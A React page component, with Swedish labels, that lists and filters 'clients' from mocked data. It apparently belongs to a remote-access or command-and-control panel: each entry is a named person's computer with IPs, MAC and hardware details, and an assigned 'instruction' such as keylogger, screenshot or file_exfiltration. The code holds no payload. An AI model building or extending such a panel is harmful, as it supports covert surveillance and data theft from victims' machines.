
import React, { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ClientsList } from "@/components/clients/ClientsList";
import { ClientDetails } from "@/components/clients/ClientDetails";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { SearchIcon } from "lucide-react";

const fetchClients = async () => {
  // In a real implementation, fetch from server
  // return await fetch('/api/clients').then(res => res.json());
  
  // Mocked data for development
  return {
    clients: [
      {
        id: "john_laptop",
        name: "John Smith",
        system: "Laptop",
        os: "Windows 10",
        osVersion: "21H2",
        ip: "192.168.1.100",
        publicIp: "84.23.45.67",
        isActive: true,
        lastActivity: "2023-03-21 14:35:22",
        lastPing: "2023-03-21 14:36:00",
        instruction: "keylogger",
        cpu: "Intel Core i7-10700K",
        cpuCores: 8,
        ramTotal: "16 GB",
        ramAvailable: "8.5 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:11:3A:B7"
      },
      {
        id: "emma_desktop",
        name: "Emma Johnson",
        system: "Desktop",
        os: "Windows 11",
        osVersion: "22H2",
        ip: "192.168.1.101",
        publicIp: "84.23.45.68",
        isActive: true,
        lastActivity: "2023-03-21 14:30:15",
        lastPing: "2023-03-21 14:31:00",
        instruction: "screenshot",
        cpu: "AMD Ryzen 9 5900X",
        cpuCores: 12,
        ramTotal: "32 GB",
        ramAvailable: "20 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:22:4B:C8"
      },
      {
        id: "david_pc",
        name: "David Anderson",
        system: "PC",
        os: "macOS",
        osVersion: "Monterey",
        ip: "192.168.1.102",
        publicIp: "84.23.45.69",
        isActive: true,
        lastActivity: "2023-03-21 14:28:10",
        lastPing: "2023-03-21 14:29:00",
        instruction: "standard",
        cpu: "Apple M1 Pro",
        cpuCores: 10,
        ramTotal: "16 GB",
        ramAvailable: "10 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:33:5C:D9"
      },
      {
        id: "sarah_laptop",
        name: "Sarah Williams",
        system: "Laptop",
        os: "Ubuntu",
        osVersion: "22.04 LTS",
        ip: "192.168.1.103",
        publicIp: "84.23.45.70",
        isActive: true,
        lastActivity: "2023-03-21 14:20:05",
        lastPing: "2023-03-21 14:21:00",
        instruction: "file_exfiltration",
        cpu: "Intel Core i5-11300H",
        cpuCores: 4,
        ramTotal: "8 GB",
        ramAvailable: "4 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:44:6D:E0"
      },
      {
        id: "alex_home",
        name: "Alex Brown",
        system: "Home",
        os: "Windows 10",
        osVersion: "21H2",
        ip: "192.168.1.104",
        publicIp: "84.23.45.71",
        isActive: true,
        lastActivity: "2023-03-21 14:15:48",
        lastPing: "2023-03-21 14:16:00",
        instruction: "system_info",
        cpu: "AMD Ryzen 5 3600",
        cpuCores: 6,
        ramTotal: "16 GB",
        ramAvailable: "9 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:55:7E:F1"
      },
      {
        id: "lisa_work",
        name: "Lisa Miller",
        system: "Work",
        os: "Windows 10",
        osVersion: "21H2",
        ip: "192.168.1.105",
        publicIp: "84.23.45.72",
        isActive: false,
        lastActivity: "2023-03-21 10:45:30",
        lastPing: "2023-03-21 10:46:00",
        instruction: "keylogger",
        cpu: "Intel Core i7-9700K",
        cpuCores: 8,
        ramTotal: "32 GB",
        ramAvailable: "15 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:66:8F:G2"
      },
      {
        id: "mark_pc",
        name: "Mark Wilson",
        system: "PC",
        os: "Windows 11",
        osVersion: "22H2",
        ip: "192.168.1.106",
        publicIp: "84.23.45.73",
        isActive: false,
        lastActivity: "2023-03-21 09:20:15",
        lastPing: "2023-03-21 09:21:00",
        instruction: "screenshot",
        cpu: "Intel Core i9-12900K",
        cpuCores: 16,
        ramTotal: "64 GB",
        ramAvailable: "40 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:77:9G:H3"
      },
      {
        id: "julia_laptop",
        name: "Julia Taylor",
        system: "Laptop",
        os: "macOS",
        osVersion: "Ventura",
        ip: "192.168.1.107",
        publicIp: "84.23.45.74",
        isActive: false,
        lastActivity: "2023-03-20 17:35:22",
        lastPing: "2023-03-20 17:36:00",
        instruction: "standard",
        cpu: "Apple M2",
        cpuCores: 8,
        ramTotal: "16 GB",
        ramAvailable: "6 GB",
        timezone: "Europe/Stockholm",
        mac: "00:1B:44:88:0H:I4"
      }
    ]
  };
};

export default function Clients() {
  const [activeTab, setActiveTab] = useState("all");
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [searchTerm, setSearchTerm] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");

  const { data, isLoading, error } = useQuery({
    queryKey: ['clients'],
    queryFn: fetchClients
  });

  const filterClients = (clients: any[]) => {
    let filtered = [...clients];
    
    // Filter by search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(client => 
        client.name.toLowerCase().includes(term) || 
        client.id.toLowerCase().includes(term) ||
        client.os.toLowerCase().includes(term)
      );
    }
    
    // Filter by status
    if (statusFilter === "online") {
      filtered = filtered.filter(client => client.isActive);
    } else if (statusFilter === "offline") {
      filtered = filtered.filter(client => !client.isActive);
    }
    
    return filtered;
  };

  const handleClientClick = (clientId: string) => {
    setSelectedClient(clientId);
  };

  const handleClientBack = () => {
    setSelectedClient(null);
  };

  if (error) {
    return <div className="p-6">Error loading clients: {error.message}</div>;
  }

  const clients = data?.clients || [];
  const filteredClients = filterClients(clients);
  const selectedClientData = clients.find(client => client.id === selectedClient);
  
  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <div className="flex items-center justify-between">
        <h2 className="text-3xl font-bold tracking-tight">Klienter</h2>
        <div className="flex items-center space-x-2">
          <Badge variant="outline">
            Totalt: {clients.length}
          </Badge>
          <Badge variant="outline" className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-200">
            Online: {clients.filter(c => c.isActive).length}
          </Badge>
          <Badge variant="outline" className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-200">
            Offline: {clients.filter(c => !c.isActive).length}
          </Badge>
        </div>
      </div>

      {!selectedClient ? (
        <>
          <div className="flex flex-col md:flex-row items-center gap-4">
            <div className="relative w-full md:w-96">
              <SearchIcon className="absolute left-2.5 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                type="search"
                placeholder="Sök klienter..."
                className="w-full pl-8"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <Select
              value={statusFilter}
              onValueChange={setStatusFilter}
            >
              <SelectTrigger className="w-full md:w-40">
                <SelectValue placeholder="Status" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">Alla statusar</SelectItem>
                <SelectItem value="online">Online</SelectItem>
                <SelectItem value="offline">Offline</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <Tabs value={activeTab} onValueChange={setActiveTab}>
            <TabsList className="grid w-full md:w-[400px] grid-cols-2">
              <TabsTrigger value="all">Alla klienter</TabsTrigger>
              <TabsTrigger value="active">Aktiva klienter</TabsTrigger>
            </TabsList>
            <TabsContent value="all" className="mt-6">
              <ClientsList 
                clients={filteredClients} 
                isLoading={isLoading} 
                onClientClick={handleClientClick} 
              />
            </TabsContent>
            <TabsContent value="active" className="mt-6">
              <ClientsList 
                clients={filteredClients.filter(client => client.isActive)} 
                isLoading={isLoading} 
                onClientClick={handleClientClick} 
              />
            </TabsContent>
          </Tabs>
        </>
      ) : (
        <div className="flex flex-col space-y-6">
          <Button 
            variant="outline" 
            onClick={handleClientBack}
            className="w-24"
          >
            Tillbaka
          </Button>
          {selectedClientData && (
            <ClientDetails client={selectedClientData} />
          )}
        </div>
      )}
    </div>
  );
}
